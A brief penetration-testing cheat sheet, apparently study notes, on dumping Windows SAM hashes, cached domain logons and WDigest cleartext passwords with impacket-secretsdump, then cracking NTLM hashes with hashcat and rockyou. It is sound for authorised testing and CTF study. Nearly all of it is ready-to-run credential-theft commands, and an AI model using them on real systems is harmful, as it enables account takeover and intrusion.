# Dumping Hashes
Whenever an account is compromised, dumping the secrets of the account is always a good idea.

How to dump information from a machine you possess the username:password:
```bash
impacket-secretsdump [DOMAIN]/[USERNAME]:'[PASSWORD]'@[IP_ADDRESS]
```
How to dump information from a machine you possess the username and hash for:
```bash
impacket-secretsdump [USERNAME]:@[IP_ADDRESS] -hashes [FULL NTLM HASH]
```
Note: NTLM hashes have a ":" that divides them between LM and NT hashes.

ALWAYS grab SAM hashes of all accounts (except Guest, WDAGUtility, They don't matter).

Worth grabbing cached domain logon info as well.

Cleartext passwords showing up are possible. Especially on older machines that use WDigest (which stores the password in plaintext).
# Cracking hashes
The only portion of NTLM hashes that need to be cracked is the NT portion of the hash.
1. Remember, the hash is structured like this: LM:NT
Store the NT hash in a txt file. e.g. ntlm.txt
2. Use hash identifier to check what should be used for hashcat:
```bash
hash-identifier
```
Enter hash when prompted.
3. Search hashcat for what options to use (optional):
```bash
hashcat --help | grep "NTLM"
```
4. Use hashcat to crack the hash:
```bash
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt 
```
* Add -O if on bare-metal
* Add -r OneRuleToRuleThemAll ruleset to include p@$$w0rd mutations.
